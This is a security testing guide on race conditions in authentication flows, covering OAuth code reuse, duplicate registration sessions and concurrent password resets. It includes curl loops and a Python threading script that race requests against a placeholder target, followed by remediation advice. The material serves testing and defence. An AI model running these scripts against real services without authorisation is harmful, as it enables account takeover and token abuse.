# Race Conditions in Authentication Flows

## Summary
Race conditions in authentication can lead to session collision, OAuth nonce reuse, privilege escalation, and account takeover.

## Detection

### Step 1: Identify Race-Prone Auth Flows
- OAuth authorisation code exchange (nonce reuse)
- Session creation during registration / login
- Email or password change flows
- Multi-step account recovery
- Concurrent login attempts from new devices

### Step 2: OAuth Nonce Reuse

```bash
# Capture an authorisation code, then race token exchange
# Normal flow produces one token per code
# Race may produce multiple tokens

# Step 1: Get auth code
CODE=$(curl -s "https://target.com/oauth/authorize?client_id=abc&redirect_uri=...&response_type=code" | grep -oP 'code=\K[^&]+')

# Step 2: Race the token exchange
for i in $(seq 1 10); do
  curl -s -X POST "https://target.com/oauth/token" \
    -d "grant_type=authorization_code&code=$CODE&client_id=abc&client_secret=secret" &
done
wait
```

If more than one token exchange succeeds, the OAuth implementation is vulnerable.

### Step 3: Session Collision During Registration
Race multiple registration requests with the same email:

```python
import requests
from concurrent.futures import ThreadPoolExecutor

url = "https://target.com/api/register"

payload = {
    "email": "race-test@example.com",
    "password": "Password123!",
    "username": "racetest"
}

def register(_):
    r = requests.post(url, json=payload)
    return r.status_code, r.cookies.get("session")

with ThreadPoolExecutor(max_workers=10) as pool:
    results = pool.map(register, range(10))
    sessions = [s for _, s in results if s]
    print(f"Unique sessions created: {len(set(sessions))}")
    print(f"Total sessions: {len(sessions)}")
```

If multiple sessions are created for the same email, the registration endpoint has no unique constraint or has a race in the user creation logic.

### Step 4: Password Reset Race
Race multiple password reset token generations:

```bash
# Request multiple password resets concurrently
for i in $(seq 1 5); do
  curl -s -X POST "https://target.com/api/forgot-password" \
    -d "email=victim@example.com" &
done
wait
```

If all reset tokens are valid simultaneously, an attacker who can intercept one can attempt all tokens.

## Remediation
- Use unique database constraints on email, username, and session tokens
- Implement row-level locking on user record during critical auth operations
- OAuth: one-time use codes must be invalidated atomically after first exchange
- Use idempotency keys on token generation endpoints
- Rate-limit auth flows per user, not per IP
